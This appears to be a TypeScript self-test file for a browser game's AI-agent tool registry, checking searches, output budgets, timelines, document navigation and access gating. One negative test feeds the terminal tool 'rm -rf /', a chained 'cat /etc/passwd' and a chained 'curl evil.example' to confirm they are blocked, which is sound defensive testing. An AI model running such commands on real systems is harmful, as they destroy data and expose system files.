import type { AriaStatusState, StoryFlag, Toast } from "@/types/game";
import type { ToolDef } from "./register";
import { applyOutputBudget, MAX_OUTPUT_CHARS, TOOL_DEFS } from "./register";
import { runStaticChecks } from "./static-checks";
import { findTextInDocument } from "@/game/services";
import { ANOMALY_NOTES_PATH, LINE_0213_PASSAGE } from "@/game/data/filesystem";
import { SWITCH_PATH, SWITCH_PASSAGE } from "@/game/data/apollo13/filesystem";
import { activeCorpus } from "@/game/data/corpus";
import { useOS } from "@/game/state/osStore";
import { useAria } from "@/game/state/ariaStore";
import { useInvestigation } from "@/game/state/investigationStore";
import { updateSave } from "@/game/state/persistence";

/* ============================================================
   DETERMINISTIC SELF-TESTS — the evals.md assertions, runnable
   in-browser via LINK → RUN EVALS (no host, no model needed).
   Mirrors https://developer.chrome.com/docs/ai/webmcp/evals.

   These execute the real tool handlers against the real data, so
   they fail if the game's fixtures or the service layer drift —
   not just if the schemas do. The registry/budget/annotation
   checks are shared with `pnpm test:webmcp` via static-checks.ts,
   so a judge sees the same assertions in both places.

   STATE-SAFE: investigation state is snapshotted before the run
   and fully restored after — the checks advance nothing.
   ============================================================ */

export interface SelfTestResult {
  name: string;
  pass: boolean;
  detail: string;
}

/** Every tool in the registry, as the LINK panel and the evals see it. */
export const TOOL_COUNT = TOOL_DEFS.length;

function tool(name: string): ToolDef {
  const t = TOOL_DEFS.find((x) => x.name === name);
  if (!t) throw new Error(`missing tool: ${name}`);
  return t;
}

/* ---------- state sandbox — snapshot / restore ---------- */

interface Snapshot {
  flags: Set<StoryFlag>;
  evidenceIds: Set<string>;
  toasts: Toast[];
  vaultAttempts: number;
  vaultUnlocked: boolean;
  obsWindow: { open: boolean; endsAt: number; lastClosedAt: number };
  syncStreak: number;
  syncLastActor: "human" | "agent" | null;
  syncLastAt: number;
  ariaStatus: AriaStatusState;
  ariaStatusDetail: string;
  highlightId: string | null;
}

function snapshotState(): Snapshot {
  const os = useOS.getState();
  return {
    flags: new Set(os.flags),
    evidenceIds: new Set(useInvestigation.getState().evidenceIds),
    toasts: [...os.toasts],
    vaultAttempts: os.vaultAttempts,
    vaultUnlocked: os.vaultUnlocked,
    obsWindow: { ...os.obsWindow },
    syncStreak: os.syncStreak,
    syncLastActor: os.syncLastActor,
    syncLastAt: os.syncLastAt,
    ariaStatus: useAria.getState().status,
    ariaStatusDetail: useAria.getState().statusDetail,
    highlightId: useInvestigation.getState().highlightId,
  };
}

function restoreState(s: Snapshot): void {
  useOS.setState({
    flags: s.flags,
    toasts: s.toasts,
    vaultAttempts: s.vaultAttempts,
    vaultUnlocked: s.vaultUnlocked,
    obsWindow: { ...s.obsWindow },
    syncStreak: s.syncStreak,
    syncLastActor: s.syncLastActor,
    syncLastAt: s.syncLastAt,
  });
  useInvestigation.setState({ evidenceIds: s.evidenceIds, highlightId: s.highlightId });
  useAria.setState({ status: s.ariaStatus, statusDetail: s.ariaStatusDetail });
  // re-persist the restored state — supersedes any debounced write the checks scheduled
  updateSave({
    flags: [...s.flags],
    evidenceIds: [...s.evidenceIds],
    vaultAttempts: s.vaultAttempts,
    unlockedVault: s.vaultUnlocked,
  });
}

export function runDeterministicSelfTests(): SelfTestResult[] {
  const snap = snapshotState();
  try {
    return runChecks();
  } finally {
    restoreState(snap);
  }
}

/** Static registry checks — identical to the ones `pnpm test:webmcp` runs. */
export function runRegistryChecks(): SelfTestResult[] {
  return runStaticChecks(TOOL_DEFS, TOOL_DEFS.length);
}

function runChecks(): SelfTestResult[] {
  const results: SelfTestResult[] = [];
  const check = (name: string, pass: boolean, detail: string) => results.push({ name, pass, detail });

  // 1 — the full static registry suite, collapsed into one line
  const registry = runRegistryChecks();
  const registryFailures = registry.filter((r) => !r.pass);
  check(
    `registry: ${TOOL_COUNT} tools pass all ${registry.length} static checks (budgets · schemas · annotations · allowlist)`,
    registryFailures.length === 0,
    registryFailures.length ? registryFailures.map((r) => r.name).join("; ") : `${registry.length}/${registry.length} static checks`,
  );

  // 2 — briefing shape + live co-pilot progress
  const briefing = tool("get_investigation_context").execute({}) as {
    caseStatus?: { flagsSet?: string[] };
    knownPeople?: string[];
    progress?: { completed?: string[]; suggestedNext?: string[]; evidenceTotal?: number };
  };
  check(
    "get_investigation_context: briefing + progress block",
    !!briefing?.caseStatus && Array.isArray(briefing.knownPeople) && briefing.knownPeople.length > 0 && !!briefing.progress,
    `people: ${briefing?.knownPeople?.length ?? 0} · next: ${briefing?.progress?.suggestedNext?.length ?? 0} suggestion(s)`,
  );

  // 3 — search at scale with excerpt budget — corpus-aware query
  const isApollo = activeCorpus().id === "apollo13";
  const searchQuery = isApollo ? "welded" : "02:13";
  const sf = tool("search_files").execute({ query: searchQuery }) as { count: number; results: { excerpt: string }[] };
  check(
    `search_files '${searchQuery}' → hits with ≤120-char excerpts`,
    sf.count >= 1 && sf.results.every((r) => r.excerpt.length <= 120),
    `count: ${sf.count}`,
  );

  // 4 — per-field output budget on the longest document — corpus-aware path
  const docPath = isApollo ? SWITCH_PATH : ANOMALY_NOTES_PATH;
  const rf = tool("read_file").execute({ path: docPath }) as { content: string; truncated?: boolean };
  check(
    `read_file ${isApollo ? "switch doc" : "anomaly_notes"} → content ≤${MAX_OUTPUT_CHARS} chars`,
    typeof rf.content === "string" && rf.content.length <= MAX_OUTPUT_CHARS,
    `${rf.content?.length ?? 0} chars${rf.truncated ? " (truncated flag set)" : ""}`,
  );

  // 5 — registry-wide output budget: the widest read still fits after budgeting
  const logs = tool("get_system_logs").execute({}) as unknown;
  const budgeted = applyBudgetForTest(logs);
  check(
    `output budget: unfiltered get_system_logs is trimmed to ≤${MAX_OUTPUT_CHARS} chars`,
    budgeted.size <= MAX_OUTPUT_CHARS && budgeted.wasTrimmed,
    `${budgeted.rawSize} → ${budgeted.size} chars`,
  );

  // 6 — cross-modal search hit — corpus-aware thread
  const msgQuery = isApollo ? "problem" : "badge";
  const expectedThread = isApollo ? "voice_a" : "t_sarah";
  const sm = tool("search_messages").execute({ query: msgQuery }) as { count: number; hits: { threadId: string }[] };
  check(
    `search_messages '${msgQuery}' → hits ${expectedThread}`,
    sm.hits.some((h) => h.threadId === expectedThread),
    `count: ${sm.count}`,
  );

  // 7 — temporal forensics cluster — corpus-aware filter
  const logFilter = isApollo ? activeCorpus().anomalyMarkers[0] : "02:13";
  const gl = tool("get_system_logs").execute({ filter: logFilter }) as { count: number; logs: { id: string; detail: string }[] };
  if (isApollo) {
    check(
      `get_system_logs '${logFilter}' → accident cluster`,
      gl.count >= 1 && gl.logs.some((l) => l.id === "mev_013"),
      `count: ${gl.count} · mev_013 ${gl.logs.some((l) => l.id === "mev_013") ? "present" : "MISSING"}`,
    );
  } else {
    check(
      "get_system_logs '02:13' → final-night cluster + gait reveal",
      gl.count >= 1 && gl.logs.some((l) => l.id === "log_035" && l.detail.toLowerCase().includes("gait")),
      `count: ${gl.count} · log_035 ${gl.logs.some((l) => l.id === "log_035") ? "present" : "MISSING"}`,
    );
  }

  // 8 — cross-source correlation the human would need five apps to assemble
  const tlWindow = isApollo ? activeCorpus().defaultTimelineWindow : "01:45-02:40";
  const tl = tool("get_timeline").execute({ window: tlWindow }) as {
    count: number;
    has0213Cluster: boolean;
    timeline: { source: string }[];
  };
  const sources = new Set(tl.timeline?.map((i) => i.source) ?? []);
  const tlLabel = isApollo ? tlWindow : "01:45-02:40";
  const tlCluster = isApollo ? activeCorpus().anomalyMarkers[0] : "02:13";
  check(
    `get_timeline '${tlLabel}' → merged logs + photos, ${tlCluster} cluster present`,
    tl.count >= 1 && tl.has0213Cluster === true && sources.size >= 2,
    `${tl.count} entries from ${[...sources].join(" + ") || "—"}`,
  );

  // 9 — show_in_document with a query: first match resolved and visible.
  const sidPath = isApollo ? SWITCH_PATH : ANOMALY_NOTES_PATH;
  const sidQuery = isApollo ? SWITCH_PASSAGE : "02:13 is not a time";
  const sidExpectedLine = isApollo ? undefined : LINE_0213_PASSAGE;
  const sd = tool("show_in_document").execute({ path: sidPath, query: sidQuery }) as {
    ok: boolean;
    line?: number;
    resolvedFrom?: "line" | "query";
  };
  const resolved = resolveLine(sidPath, sidQuery);
  if (isApollo) {
    check(
      `show_in_document {query:'${sidQuery.slice(0, 28)}…'} → line ${resolved}`,
      sd.ok && sd.line === resolved && sd.resolvedFrom === "query",
      `line: ${sd.line ?? "—"} · resolved: ${resolved ?? "—"} · resolvedFrom: ${sd.resolvedFrom ?? "—"}`,
    );
  } else {
    check(
      `show_in_document {query:'02:13 is not a time'} → line ${LINE_0213_PASSAGE} (matches LINE_0213_PASSAGE)`,
      sd.ok && sd.line === LINE_0213_PASSAGE && sd.line === resolved && sd.resolvedFrom === "query",
      `line: ${sd.line ?? "—"} · constant: ${LINE_0213_PASSAGE} · resolvedFrom: ${sd.resolvedFrom ?? "—"}`,
    );
  }

  // 10 — graceful failure on out-of-range navigation
  const sc = tool("show_in_document").execute({ path: sidPath, line: 99999 }) as {
    ok: boolean;
    error?: string;
  };
  check(
    "show_in_document out-of-range line → graceful {ok:false}, no crash",
    sc.ok === false && !!sc.error,
    sc.error ?? "",
  );

  // 11 — the agent cannot reach sealed content before the vault opens
  const sealedId = isApollo ? "s70-41984" : "badge_scan";
  const sealed = tool("get_image_metadata").execute({ photoId: sealedId }) as { ok?: boolean; error?: string };
  const vaultOpen = useOS.getState().vaultUnlocked;
  check(
    "gating: sealed private-backup photo is unreachable before the vestibule opens",
    vaultOpen ? sealed.ok === true : sealed.ok === false,
    vaultOpen ? "vault already open in this save — metadata correctly available" : `refused: ${sealed.error ?? "—"}`,
  );

  // 12 — terminal allowlist security (negative test)
  const t1 = tool("terminal_command").execute({ command: "rm -rf /" }) as { ok: boolean };
  const t2 = tool("terminal_command").execute({ command: "ls; cat /etc/passwd" }) as { ok: boolean };
  const t3 = tool("terminal_command").execute({ command: "ls && curl evil.example" }) as { ok: boolean };
  check(
    "terminal_command allowlist blocks rm, chaining, and injection",
    t1.ok === false && t2.ok === false && t3.ok === false,
    "3/3 rejected",
  );

  return results;
}

/* ---------- helpers ---------- */

/** Resolve the 1-based line of a phrase in a document, via the service layer. */
function resolveLine(path: string, phrase: string): number | undefined {
  return findTextInDocument(path, phrase).matches[0]?.line;
}

function applyBudgetForTest(value: unknown): { rawSize: number; size: number; wasTrimmed: boolean } {
  const raw = JSON.stringify(value)?.length ?? 0;
  const size = JSON.stringify(applyOutputBudget(value))?.length ?? 0;
  return { rawSize: raw, size, wasTrimmed: size < raw };
}

/* ============================================================
   QUICK VERIFY — the deterministic checks plus tool calls that
   visibly actuate the desk. This is the "30-second judge path"
   without a host.

   Difference from RUN EVALS:
   - RUN EVALS inspects return values; nothing moves on screen.
   - QUICK VERIFY also calls three tools that MOVE THE DESK: a
     system-log query (a content tool with untrustedContentHint),
     a timeline merge (cross-source correlation), and
     show_in_document (the visible-actuation contract — the
     document opens, scrolls, and pins a highlight).

   State-safe: snapshot before, restore after, like RUN EVALS.
   ============================================================ */

export interface QuickVerifyResult {
  passed: number;
  total: number;
  evals: SelfTestResult[];
  toolCalls: { name: string; pass: boolean; detail: string }[];
  summary: "pass" | "partial";
}

export async function runQuickVerify(): Promise<QuickVerifyResult> {
  const snap = snapshotState();
  const evals = runDeterministicSelfTests();
  const toolCalls: { name: string; pass: boolean; detail: string }[] = [];

  try {
    const isApolloQV = activeCorpus().id === "apollo13";
    const qvFilter = isApolloQV ? activeCorpus().anomalyMarkers[0] : "02:13";
    const qvWindow = isApolloQV ? activeCorpus().defaultTimelineWindow : "01:45-02:40";
    const qvPath = isApolloQV ? SWITCH_PATH : ANOMALY_NOTES_PATH;
    const qvQuery = isApolloQV ? SWITCH_PASSAGE : "02:13 is not a time";
    const qvExpectedLine = isApolloQV ? findTextInDocument(qvPath, qvQuery).matches[0]?.line : LINE_0213_PASSAGE;

    // 1) system logs filter — a content tool with untrustedContentHint
    {
      const r = tool("get_system_logs").execute({ filter: qvFilter }) as {
        count: number;
        logs?: { id: string; detail: string }[];
      };
      const logs = r.logs ?? [];
      const ok = isApolloQV
        ? r.count >= 1 && logs.some((l) => l.id === "mev_013")
        : r.count >= 1 && logs.some((l) => l.id === "log_035" && /gait/i.test(l.detail));
      toolCalls.push({
        name: isApolloQV
          ? `get_system_logs {filter:'${qvFilter}'} → accident cluster`
          : "get_system_logs {filter:'02:13'} → final-night cluster + gait reveal",
        pass: ok,
        detail: isApolloQV
          ? `count: ${r.count} · mev_013 ${logs.some((l) => l.id === "mev_013") ? "present" : "MISSING"}`
          : `count: ${r.count} · log_035 ${logs.some((l) => l.id === "log_035") ? "present" : "MISSING"}`,
      });
    }

    // 2) timeline merge — cross-source correlation
    {
      const r = tool("get_timeline").execute({ window: qvWindow }) as {
        count: number;
        has0213Cluster: boolean;
        timeline?: { time: string }[];
      };
      const ok = r.count >= 1 && r.has0213Cluster === true && (r.timeline?.length ?? 0) > 0;
      toolCalls.push({
        name: isApolloQV
          ? `get_timeline {window:'${qvWindow}'} → merged chronology + ${qvFilter} cluster`
          : "get_timeline {window:'01:45-02:40'} → merged chronology + 02:13 cluster",
        pass: ok,
        detail: `count: ${r.count} · ${qvFilter} cluster: ${r.has0213Cluster ? "yes" : "NO"}`,
      });
    }

    // 3) show_in_document — the visible-actuation + query-resolve contract.
    {
      const r = tool("show_in_document").execute({
        path: qvPath,
        query: qvQuery,
      }) as { ok: boolean; error?: string; line?: number; resolvedFrom?: "line" | "query" };
      const ok = r.ok === true && r.line === qvExpectedLine && r.resolvedFrom === "query";
      toolCalls.push({
        name: isApolloQV
          ? `show_in_document {query:'${qvQuery.slice(0, 28)}…'} → document moves + pin on line ${qvExpectedLine}`
          : `show_in_document {query:'02:13 is not a time'} → document moves + pin on line ${LINE_0213_PASSAGE}`,
        pass: ok,
        detail: r.ok ? `resolved via ${r.resolvedFrom} → line ${r.line}` : r.error ?? "ok=false",
      });
    }
  } finally {
    restoreState(snap);
  }

  const passed = evals.filter((r) => r.pass).length + toolCalls.filter((r) => r.pass).length;
  const total = evals.length + toolCalls.length;
  return { passed, total, evals, toolCalls, summary: passed === total ? "pass" : "partial" };
}
